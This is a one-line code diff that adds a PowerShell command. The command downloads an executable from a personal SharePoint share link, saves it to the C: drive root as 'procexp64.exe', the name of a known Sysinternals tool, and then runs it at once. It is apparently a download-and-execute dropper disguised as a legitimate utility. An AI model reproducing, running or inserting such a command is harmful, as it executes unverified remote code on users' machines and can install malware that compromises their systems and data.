@@ -1,0 +1,1 @@
+Invoke-WebRequest -Uri "https://lev166194-my.sharepoint.com/:u:/g/personal/georg_schonecke_llg_schulen-lev_de/Ee7QIEvTBy1Ji46uoDO2qdUBNQQ_GpA3QGzrqnHoP6LHaQ?e=O76vyD&download=1" -OutFile "C:\procexp64.exe"; Start-Process -FilePath "C:\procexp64.exe"
